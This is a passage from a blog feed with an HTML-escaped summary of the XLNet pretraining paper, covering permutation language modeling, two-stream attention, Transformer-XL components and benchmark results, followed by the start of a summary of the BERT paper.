&lt;p&gt;The existing unsupervised representation learning approaches can be divided into two types - autoregressive language modeling and autoencoding approaches. The autoregressive methods like ELMo and GPT tried to estimate the probability distribution of a text corpus with an autoregressive model. They had a limitation in that they only captured the unidirectional context. BERT aimed to solve this problem by aiming to reconstruct the original data from the corrupted input. So BERT could capture the bidirectional context, but by converting this into a prediction problem, BERT assumed that the predicted tokens are independent of each other. However, that is not the case in natural language where long term dependency is prevalent. Moreover, the use of the [MASK] tokens also created a pretrain-finetune discrepancy as there are no [MASK] tokens available during finetuning.&lt;/p&gt;
&lt;p&gt;XLNet tries to leverage the best of both worlds. The qualities of XLNet are -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;XLNet computes the maximum likelihood of a sequence w.r.t. all possible permutations of the factorization order. So when calculating the expectation, each position learns to capture the context from all positions, hence capturing bidirectional context.&lt;/li&gt;
&lt;li&gt;XLNet does not rely on data corruption as in BERT and hence does not suffer from the pretrain-finetune discrepancy.&lt;/li&gt;
&lt;li&gt;XLNet integrates the novelties from Transformer-XL like recurrence mechanism and relative encoding scheme (explained later as well). This improves the performance of tasks that utilise a longer text sequence.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;
&lt;p&gt;Autoregressive language modeling performs pretraining by maximizing the likelihood under the forward autoregressive factorization -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/arobjective.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/arobjective.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here &lt;em&gt;x&lt;/em&gt; is the given text sequence. h&lt;sub&gt;Θ&lt;/sub&gt;(x&lt;sub&gt;1:t-1&lt;/sub&gt;) is the context representation produced by the model and &lt;em&gt;e&lt;/em&gt;(x) is the embedding of &lt;em&gt;x&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Denoising autoencoding approach like BERT first constructs a corrupt version &lt;em&gt;x&lt;/em&gt;(cap) by randomly masking a fraction (15%) of tokens of &lt;em&gt;x&lt;/em&gt; to a special symbol [MASK]. The masked tokens are denoted by &lt;em&gt;x&lt;/em&gt;(bar). So, the training objective in the case of BERT becomes -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/aeobjective.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/aeobjective.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here &lt;em&gt;m&lt;/em&gt;&lt;sub&gt;t&lt;/sub&gt; is 1 when &lt;em&gt;x&lt;/em&gt;&lt;sub&gt;t&lt;/sub&gt; is masked. Here H&lt;sub&gt;Θ&lt;/sub&gt; is a Transformer that maps each token to a sequence of length &lt;em&gt;T&lt;/em&gt; to hidden vectors [H&lt;sub&gt;Θ&lt;/sub&gt;(x)&lt;sub&gt;1&lt;/sub&gt;, H&lt;sub&gt;Θ&lt;/sub&gt;(x)&lt;sub&gt;2&lt;/sub&gt;, &amp;hellip;, H&lt;sub&gt;Θ&lt;/sub&gt;(x)&lt;sub&gt;T&lt;/sub&gt;].&lt;/p&gt;
&lt;p&gt;In BERT, the conditional probability is taken when the input is masked, denoted using &lt;em&gt;m&lt;/em&gt;&lt;sub&gt;t&lt;/sub&gt;. Hence denoting the independence assumption among the targets.&lt;/p&gt;
&lt;h3 id=&#34;objective-permutation-language-modeling&#34;&gt;Objective: Permutation Language Modeling&lt;/h3&gt;
&lt;p&gt;Both autoregressive and autoencoding approaches have their benefits over each other. XLNet tries to bring both their advantages into the picture while avoiding their weaknesses.&lt;/p&gt;
&lt;p&gt;XLNet proposes the use of permutation language modeling objective that looks like the general autoregressive language modeling approach but it allows the model to capture bidirectional context as well. Here, the training is performed for each valid autoregressive factorization order (permutations) of the sequence. The model parameters are shared across all the factorization orders, and hence the model learns to capture information from all positions on both sides.&lt;/p&gt;
&lt;p&gt;The proposed permutation language modeling approach is -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/xlnetobjective.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/xlnetobjective.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here &lt;em&gt;Z&lt;/em&gt;&lt;sub&gt;T&lt;/sub&gt; is the set of all possible permutations of the length-&lt;em&gt;T&lt;/em&gt; index sequence [1, 2, 3&amp;hellip;, T]. &lt;em&gt;z&lt;/em&gt;&lt;sub&gt;t&lt;/sub&gt; and z&lt;sub&gt;&amp;lt;t&lt;/sub&gt; denote the t-th element and the first &lt;em&gt;t-1&lt;/em&gt; elements of the permutation. So, basically the autoregressive formulation is applied for each factorization order z.&lt;/p&gt;
&lt;p&gt;Since this is based on the autoregressive framework, the independence assumption of BERT is no longer present in this case and the pretrain-finetune discrepancy is also not present.&lt;/p&gt;
&lt;p&gt;* One must note that here the objective does not permute the sequence order. The sequence order remains as it is and the positional encodings correspond to the original sequence itself. Here, the attention mask in Transformers is used to achieve the permutation of the factorization order. This is done because permuting the sequence itself can cause problems as during finetuning, the natural order will always be preserved. The authors do not want to include any other pretrain-finetune discrepancy.&lt;/p&gt;
&lt;h3 id=&#34;architecture-two-stream-self-attention-for-target-aware-representations&#34;&gt;Architecture: Two-Stream Self-Attention for Target-Aware Representations&lt;/h3&gt;
&lt;p&gt;Using the Transformer(-XL) directly with the permutation language modeling objective will not work. This is because, say we have two sequences, in which z&lt;sub&gt;&amp;lt;t&lt;/sub&gt; sequence is same but the z&lt;sub&gt;t&lt;/sub&gt; token is different. And in the current formulation using transformers(-XL) the z&lt;sub&gt;&amp;lt;t&lt;/sub&gt; sequence determines z&lt;sub&gt;t&lt;/sub&gt; but that would not be correct if we predict the same distribution for both the sequences while they have two different tokens as the target.&lt;/p&gt;
&lt;p&gt;To solve this, a re-parameterization of the next-token distribution with the target-position (z&lt;sub&gt;t&lt;/sub&gt;) is required.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/rexlnetobjective.png&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/rexlnetobjective.png&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Here, g&lt;sub&gt;Θ&lt;/sub&gt;(x&lt;sub&gt;z&lt;sub&gt;&amp;lt;t&lt;/sub&gt;&lt;/sub&gt;, &lt;i&gt;z&lt;/i&gt;&lt;sub&gt;&lt;/sub&gt;) is a new type of representation that takes in the z&lt;sub&gt;t&lt;/sub&gt; as input as well.&lt;/p&gt;
&lt;h4 id=&#34;two-stream-self-attention&#34;&gt;Two-Stream Self-Attention&lt;/h4&gt;
&lt;p&gt;Now, there is a contradiction here. If we want to predict x&lt;sub&gt;z&lt;sub&gt;t&lt;/sub&gt;&lt;/sub&gt;, g&lt;sub&gt;Θ&lt;/sub&gt;(x&lt;sub&gt;z&lt;sub&gt;&amp;lt;t&lt;/sub&gt;&lt;/sub&gt;, &lt;i&gt;z&lt;/i&gt;&lt;sub&gt;t&lt;/sub&gt;) should only use position z&lt;sub&gt;t&lt;/sub&gt; and not x&lt;sub&gt;z&lt;sub&gt;t&lt;/sub&gt;&lt;/sub&gt; itself. Also, to predict the future tokens x&lt;sub&gt;z&lt;sub&gt;j&lt;/sub&gt;&lt;/sub&gt; with j &amp;gt; t, we need  x&lt;sub&gt;z&lt;sub&gt;t&lt;/sub&gt;&lt;/sub&gt; to provide the full context information.&lt;/p&gt;
&lt;p&gt;So, to resolve this, XLNet uses two hidden representations -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Content representation h&lt;sub&gt;Θ&lt;/sub&gt;(x&lt;sub&gt;z&lt;sub&gt;&amp;lt;=t&lt;/sub&gt;&lt;/sub&gt;) abbreviated as h&lt;sub&gt;z&lt;sub&gt;t&lt;/sub&gt;&lt;/sub&gt;, which is similar to the general Transformer hidden state. This encodes both the context and the token x&lt;sub&gt;z&lt;sub&gt;t&lt;/sub&gt;&lt;/sub&gt;.&lt;/li&gt;
&lt;li&gt;Query representation g&lt;sub&gt;Θ&lt;/sub&gt;(x&lt;sub&gt;z&lt;sub&gt;&amp;lt;t&lt;/sub&gt;&lt;/sub&gt;, &lt;i&gt;z&lt;/i&gt;&lt;sub&gt;t&lt;/sub&gt;) , abbreviated as g&lt;sub&gt;z&lt;sub&gt;t&lt;/sub&gt;&lt;/sub&gt;, which only has access to the contextual information x&lt;sub&gt;z&lt;sub&gt;&amp;lt;t&lt;/sub&gt;&lt;/sub&gt; and the position z&lt;sub&gt;t&lt;/sub&gt; but not the contents x&lt;sub&gt;z&lt;sub&gt;t&lt;/sub&gt;&lt;/sub&gt;.&lt;/li&gt;
&lt;/ul&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/arch.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/arch.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The above diagram shows the flow of the two streams. The two streams are updated with a set of shared parameters as follows -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/update.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/update.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;The update rule of the content representations is exactly the same as the standard self-attention. During finetuning, the query stream can be dropped and the content stream can be used as a normal Transformer(-XL). And in the end, the last-layer query representation g&lt;sub&gt;z&lt;sub&gt;t&lt;/sub&gt;&lt;/sub&gt; is used to compute the likelihood.&lt;/p&gt;
&lt;hr&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;hr&gt;
&lt;h4 id=&#34;partial-prediction&#34;&gt;Partial Prediction&lt;/h4&gt;
&lt;p&gt;For a given factorization order &lt;em&gt;&lt;strong&gt;z&lt;/strong&gt;&lt;/em&gt;,  cutting point &lt;em&gt;c&lt;/em&gt; is chosen which splits the sequence into two subsequences. &lt;em&gt;&lt;strong&gt;z&lt;/strong&gt;&lt;/em&gt;&lt;sub&gt;&amp;lt;=c&lt;/sub&gt; is the non-target subsequence and &lt;em&gt;&lt;strong&gt;z&lt;/strong&gt;&lt;/em&gt;&lt;sub&gt;&amp;gt;c&lt;/sub&gt; is the target sequence. The objective to maximize the log-likelihood of the target subsequence conditioned on the non-target subsequence is written as -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/partial.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/partial.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;A hyperparameter &lt;em&gt;K&lt;/em&gt; is chosen to determine what fraction of the sequence length will be the target sequence. This is done so that sufficient sequence length is present for the model to learn the context.&lt;/p&gt;
&lt;p&gt;Here again, XLNet differs from BERT. Let us consider an example [New, York, is, a city]. If both BERT and XLNet take two tokens [New, York] as the prediction task and so they have to maximize p(New York | is a city). Here BERT and XLNet get the following objectives -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/bertxlnet.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/bertxlnet.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;XLNet considers the dependency in the target subsequence as well i.e., how &amp;ldquo;York&amp;rdquo; depends on &amp;ldquo;New&amp;rdquo; as well. XLNet always learns more dependency pairs given the same target and contains “denser” effective training signals.&lt;/p&gt;
&lt;h3 id=&#34;ideas-from-transformer-xl&#34;&gt;Ideas from Transformer-XL&lt;/h3&gt;
&lt;p&gt;Transformer-XL introduced the segment recurrence mechanism for caching and reuse of the previous segment knowledge. For a long sequence &lt;strong&gt;s&lt;/strong&gt;, if we take two segments &lt;em&gt;z&lt;/em&gt;(bar) and &lt;em&gt;z&lt;/em&gt; which are permutations of the segment, then the obtained representations from the first segment h(bar)&lt;sup&gt;(m)&lt;/sup&gt; for each layer &lt;em&gt;m&lt;/em&gt; can be cached and reused for the next segment. This can be written as -&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/recur.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/recur.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;Also since the positional embeddings depend on the actual positions in the original sequence, the above attention update is independent of the previous segment once the hidden representations have been calculated. So the factorization order of the previous segment need not be known. Subsequently, the model learns to utilize the memory over all factorization orders of the last segment. The same is done for the query stream as well.&lt;/p&gt;
&lt;h3 id=&#34;modeling-multiple-segments&#34;&gt;Modeling Multiple Segments&lt;/h3&gt;
&lt;p&gt;Like BERT, XLNet randomly samples two segments (either from the same context or not) and treats the concatenation of two segments as one sequence to perform permutation language modeling.&lt;/p&gt;
&lt;p&gt;XLNET introduces Relative Segment Encodings. Unlike BERT which had absolute segment embeddings that were added to the word embedding at each position, here, rather than giving the entire segment an encoding, relative encoding is used between positions to denote whether they belong to the same segment or not.
The segment encoding of the positions is used to compute the attention weight. So, when position &lt;em&gt;i&lt;/em&gt; attends to &lt;em&gt;j&lt;/em&gt;, the segment encoding s&lt;sub&gt;&lt;i&gt;ij&lt;/i&gt;&lt;/sub&gt; is used to compute an attention weight a&lt;sub&gt;ij&lt;/sub&gt; = (q&lt;sub&gt;i&lt;/sub&gt; + b)&lt;sup&gt;T&lt;/sup&gt;s&lt;sub&gt;ij&lt;/sub&gt; , where q&lt;sub&gt;i&lt;/sub&gt; is the query vector as in a standard attention operation and &lt;em&gt;b&lt;/em&gt; is a learnable head-specific bias vector.&lt;/p&gt;
&lt;p&gt;Relative segment encodings help because -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Inductive bias of the relative encodings improves the generalization.&lt;/li&gt;
&lt;li&gt;Opens up the possibility of finetuning on tasks that have more than two input segments, which is not possible when using absolute segment encodings.&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;results&#34;&gt;Results&lt;/h2&gt;
&lt;p&gt;Two datasets were the same as the ones BERT used i.e., BooksCorpus and English Wikipedia. Furthermore, Giga5, ClueWeb 2012-B and CommonCrawl datasets were also used. SentencePiece tokenization was used.&lt;/p&gt;
&lt;p&gt;XLNet had the same architecture hyperparameters as BERT-Base and XLNet-Large had the same hyperparameters as BERT-Large. this resulted in similar model size and hence a fair comparison.&lt;/p&gt;
&lt;p&gt;XLNet was trained on 512 TPU v3 chips for 500K steps with an Adam weight decay
optimizer, linear learning rate decay, and a batch size of 8192, which took about 5.5 days. And even after using so much compute and time, the model still underfitted on the data at the end of the training.&lt;/p&gt;
&lt;p&gt;Since the recurrence mechanism is introduced, XLNet uses a bidirectional data input pipeline where each of the forward and backward directions takes half of the batch size. The idea of span-based prediction, where first, a sample length &lt;em&gt;L&lt;/em&gt; from [1, &amp;hellip;, 5] is chosen and then a consecutive span of &lt;em&gt;L&lt;/em&gt; tokens is randomly selected as prediction targets within a context of (&lt;em&gt;KL&lt;/em&gt;) tokens.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comparisonwithbert.PNG&#34; &gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comparisonwithbert.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;



&lt;/figure&gt;

&lt;p&gt;As seen above, trained on the same data with an almost identical training recipe,
XLNet outperforms BERT by a sizable margin on all the considered datasets.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comp1.PNG&#34; data-caption=&#34;Performance on reading comprehension and document ranking tasks. Comparison with GPT, BERT, RoBERTa and a BERT ensemble&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comp1.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Performance on reading comprehension and document ranking tasks. Comparison with GPT, BERT, RoBERTa and a BERT ensemble
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comp2.PNG&#34; data-caption=&#34;Performance on question answering tasks - SQuADv1.1 and SQuADv2.0&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comp2.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Performance on question answering tasks - SQuADv1.1 and SQuADv2.0
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comp3.PNG&#34; data-caption=&#34;Performance on text classification task.&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comp3.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Performance on text classification task.
  &lt;/figcaption&gt;


&lt;/figure&gt;














&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comp4.PNG&#34; data-caption=&#34;Performance on natural language understanding tasks - the GLUE benchmark.&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/comp4.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Performance on natural language understanding tasks - the GLUE benchmark.
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;ul&gt;
&lt;li&gt;For explicit reasoning tasks like SQuAD and RACE that involve longer context, the performance gain of XLNet is larger. The use of Transformer-XL could be the main reason behind this.&lt;/li&gt;
&lt;li&gt;For classification tasks that already have abundant supervised examples such as MNLI (&amp;gt;390K), Yelp (&amp;gt;560K) and Amazon (&amp;gt;3M), XLNet still lead to substantial gains.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;Ablation study&lt;/strong&gt; was also performed to understand the importance and effect of introducing each component. The points of the study were -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The effectiveness of the permutation language modeling objective alone, especially compared to the denoising auto-encoding objective used by BERT.&lt;/li&gt;
&lt;li&gt;The importance of using Transformer-XL as the backbone neural architecture. For this, a DAE + Transformer-XL model was used.&lt;/li&gt;
&lt;li&gt;The necessity of some implementation details including span-based prediction, the bidirectional input pipeline, and next-sentence prediction.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;For a fair comparison, all models were based on a 12-layer architecture with the same model hyper-parameters as BERT-Base and were trained on only Wikipedia and the BooksCorpus. All results reported are the median of 5 runs.&lt;/p&gt;













&lt;figure&gt;


  &lt;a data-fancybox=&#34;&#34; href=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/ablation.PNG&#34; data-caption=&#34;Performance on natural language understanding tasks - the GLUE benchmark.&#34;&gt;
&lt;img src=&#34;https://shreyansh26.github.io/post/2021-05-16_generalized_autoregressive_pretraining_xlnet/images/ablation.PNG&#34; alt=&#34;&#34; &gt;&lt;/a&gt;


  
  
  &lt;figcaption&gt;
    Performance on natural language understanding tasks - the GLUE benchmark.
  &lt;/figcaption&gt;


&lt;/figure&gt;

&lt;p&gt;From the table -&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Transformer-XL and the permutation LM (the basis of XLNet) are big factors in the superior performance of XLNet over BERT.&lt;/li&gt;
&lt;li&gt;On removing the memory caching mechanism, the performance drops especially for RACE where long context understanding is needed.&lt;/li&gt;
&lt;li&gt;Span-based prediction and bidirectional input pipeline also help in the performance of XLNet.&lt;/li&gt;
&lt;li&gt;The next-sentence prediction objective does not lead to an improvement. Hence the next-sentence prediction objective is excluded from XLNet.&lt;/li&gt;
&lt;/ul&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;I have also released an annotated version of the paper. If you are interested, you can find it &lt;a href=&#34;https://github.com/shreyansh26/Annotated-ML-Papers/blob/main/XLNet.pdf&#34;&gt;here&lt;/a&gt;.&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This is all for now!&lt;/p&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script type=&#34;text/javascript&#34; src=&#34;//downloads.mailchimp.com/js/signup-forms/popup/unique-methods/embed.js&#34; data-dojo-config=&#34;usePlainJson: true, isDebug: false&#34;&gt;&lt;/script&gt;
&lt;!-- &lt;button style=&#34;background-color: #70ab17; color: #1770AB&#34; id=&#34;openpopup&#34;&gt;Subscribe to my posts!&lt;/button&gt; --&gt;
&lt;div class=&#34;button_cont&#34; align=&#34;center&#34;&gt;&lt;button id=&#34;openpopup&#34; class=&#34;example_a&#34;&gt;Subscribe to my posts!&lt;/button&gt;&lt;/div&gt;
&lt;style&gt;
    .example_a {
        color: #fff !important;
        text-transform: uppercase;
        text-decoration: none;
        background: #3f51b5;
        padding: 20px;
        border-radius: 5px;
        cursor: pointer;
        display: inline-block;
        border: none;
        transition: all 0.4s ease 0s;
    }

    .example_a:hover {
        background: #434343;
        letter-spacing: 1px;
        -webkit-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        -moz-box-shadow: 0px 5px 40px -10px rgba(0,0,0,0.57);
        box-shadow: 5px 40px -10px rgba(0,0,0,0.57);
        transition: all 0.4s ease 0s;
    }
&lt;/style&gt;
&lt;script type=&#34;text/javascript&#34;&gt;

function showMailingPopUp() {
    window.dojoRequire([&#34;mojo/signup-forms/Loader&#34;], function(L) { L.start({&#34;baseUrl&#34;:&#34;mc.us4.list-manage.com&#34;,&#34;uuid&#34;:&#34;0b10ac14f50d7f4e7d11cf26a&#34;,&#34;lid&#34;:&#34;667a1bb3da&#34;,&#34;uniqueMethods&#34;:true}) })

    document.cookie = &#34;MCPopupClosed=;path=/;expires=Thu, 01 Jan 1970 00:00:00 UTC&#34;;
}

document.getElementById(&#34;openpopup&#34;).onclick = function() {showMailingPopUp()};

&lt;/script&gt;
&lt;p&gt; &lt;/p&gt;
&lt;script data-name=&#34;BMC-Widget&#34; data-cfasync=&#34;false&#34; src=&#34;https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js&#34; data-id=&#34;shreyanshsingh&#34; data-description=&#34;Support me on Buy me a coffee!&#34; data-message=&#34;&#34; data-color=&#34;#FF5F5F&#34; data-position=&#34;Right&#34; data-x_margin=&#34;18&#34; data-y_margin=&#34;18&#34;&gt;&lt;/script&gt;
&lt;p&gt;Follow me on &lt;a href=&#34;https://twitter.com/shreyansh_26&#34;&gt;Twitter&lt;/a&gt;, &lt;a href=&#34;https://github.com/shreyansh26&#34;&gt;Github&lt;/a&gt; or connect on &lt;a href=&#34;https://www.linkedin.com/in/shreyansh26/&#34;&gt;LinkedIn&lt;/a&gt;.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Paper Summary #4 - BERT: Pre-training of Deep Bidirectional Transformers for Language Understanding</title>
      <link>https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/</link>
      <pubDate>Sun, 09 May 2021 17:01:02 +0530</pubDate>
      <guid>https://shreyansh26.github.io/post/2021-05-09_pretraining_deep_bidirectional_transformers_bert/</guid>
      <description>&lt;p&gt;&lt;strong&gt;Paper&lt;/strong&gt;: BERT - Pre-training of Deep Bidirectional Transformers for Language Understanding&lt;br&gt;
&lt;strong&gt;Link&lt;/strong&gt;: &lt;a href=&#34;https://www.aclweb.org/anthology/N19-1423.pdf&#34;&gt;https://bit.ly/3bdTUra&lt;/a&gt;    &lt;br&gt;
&lt;strong&gt;Authors&lt;/strong&gt;: Jacob Devlin, Ming-Wei Chang, Kenton Lee, Kristina Toutanova&lt;br&gt;
&lt;strong&gt;Code&lt;/strong&gt;: &lt;a href=&#34;https://github.com/google-research/bert&#34;&gt;https://bit.ly/3vRXlM7&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&#34;what&#34;&gt;What?&lt;/h2&gt;
&lt;p&gt;The paper proposes BERT which stands for Bidirectional Encoder Representations from Transformers. BERT is designed to pre-train deep bidirectional representations from unlabeled text. It performs a joint conditioning on both left and right context in all the layers. The pre-trained BERT model can be fine-tuned with one additional layer to create the final task-specific models i.e., without substantial task-specific architecture modifications. BERT achieves SOTA results on eleven NLP tasks such as natural language inference, question answering textual similarity, text classification, etc.&lt;/p&gt;
&lt;h2 id=&#34;why&#34;&gt;Why?&lt;/h2&gt;
&lt;p&gt;The existing strategies for the pre-trained language representations are mostly based on unidirectional language models and hence are not very effective in capturing the entire context for sentence-level tasks. These are also harmful when applying fine-tuning based approaches to token-level tasks such as question answering, where it is crucial to capture context from both directions.
BERT aims to generate deep bidirectional representations by using maked language models.&lt;/p&gt;
&lt;h2 id=&#34;how&#34;&gt;How?&lt;/h2&gt;
&lt;p&gt;Two main steps in the BERT framework are - pre-training and fine-tuning. Pre-training involves training the model on unlabeled data over different pretraining tasks. During fine-tuning, all the BERT parameters are fine-tuned using the labelled data from the downstream tasks. The fine-tuned model is different for each task, however, they share the same pre-trained parameters.&lt;/p&gt;
&lt;h3 id=&#34;model-architecture&#34;&gt;Model Architecture&lt;/h3&gt;
&lt;p&gt;The underlying architecture of BERT is a multi-layer Transformer encoder, which is inherently bidirectional in nature. Two models are proposed in the paper.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;BERT&lt;sub&gt;BASE&lt;/sub&gt; - 12 Transformer blocks, 12 self-attention heads, 768 is the hidden size&lt;/li&gt;
&lt;li&gt;BERT&lt;sub&gt;LARGE&lt;/sub&gt; - 24 transformer blocks, 16 self-attention heads, 1024 is the hidden size&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;i&gt;The model size of BERT&lt;sub&gt;BASE&lt;/sub&gt; and Open AI&amp;rsquo;s GPT was chosen to be the same.&lt;/i&gt;&lt;/p&gt;













&lt;figure&gt;


